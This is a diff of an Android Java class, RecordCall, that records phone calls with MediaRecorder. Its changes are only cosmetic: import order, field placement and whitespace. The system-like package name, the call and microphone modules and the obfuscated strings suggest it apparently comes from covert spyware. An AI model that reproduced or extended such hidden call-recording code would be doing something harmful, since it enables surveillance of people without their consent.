@@ -1,12 +1,9 @@
 package com.android.syssetup.module.call;
 
-import java.io.File;
-import java.util.HashMap;
-import java.util.concurrent.TimeUnit;
-
 import android.media.MediaRecorder;
 import android.os.Build;
 
+import com.android.mm.M;
 import com.android.syssetup.Call;
 import com.android.syssetup.Device;
 import com.android.syssetup.Status;
@@ -16,18 +13,21 @@ import com.android.syssetup.file.Path;
 import com.android.syssetup.module.ModuleCall;
 import com.android.syssetup.module.ModuleMic;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
+
+import java.io.File;
+import java.util.HashMap;
+import java.util.concurrent.TimeUnit;
 
 public class RecordCall {
-	private static final String TAG = "RecordCall";
-	
-	static RecordCall singleton;
 	protected static final int CALL_PHONE = 0x0145;
+	private static final String TAG = "RecordCall";
+	static RecordCall singleton;
 	private String currentRecordFile;
 	// private Date fromTime;
 	// private String number, model;
 	private int strategy = 0;
-	
+	private MediaRecorder recorder = null;
+
 	public synchronized static RecordCall self() {
 		if (singleton == null) {
 			singleton = new RecordCall();
@@ -35,9 +35,6 @@ public class RecordCall {
 
 		return singleton;
 	}
-	
-	private MediaRecorder recorder = null;
-	
 
 	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
 		// Create dummy file
@@ -67,7 +64,7 @@ public class RecordCall {
 
 		return success;
 	}
-	
+
 
 	private int getStrategyNotYetWorking(ModuleCall module) {
 		Markup markupCallStrategy = new Markup(module);
@@ -191,7 +188,6 @@ public class RecordCall {
 	}
 
 
-
 	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
 		recorder = new MediaRecorder();
 
@@ -233,7 +229,7 @@ public class RecordCall {
 		recorder = null;
 		return true;
 	}
-	
+
 	public boolean isSupported(ModuleCall module) {
 		String model = Build.MODEL.toLowerCase();
 		boolean supported = false;
@@ -250,7 +246,7 @@ public class RecordCall {
 				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
 			}
 		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy
-															// Nexus
+			// Nexus
 			supported = true;
 			strategy = MediaRecorder.AudioSource.DEFAULT;
 
@@ -286,7 +282,7 @@ public class RecordCall {
 		module.recordFlag = supported;
 		return supported;
 	}
-	
+
 	public boolean recordCall(final ModuleCall module, final Call call, final boolean incoming) {
 		if (!call.isOngoing()) {
 			if (stopRecord()) {
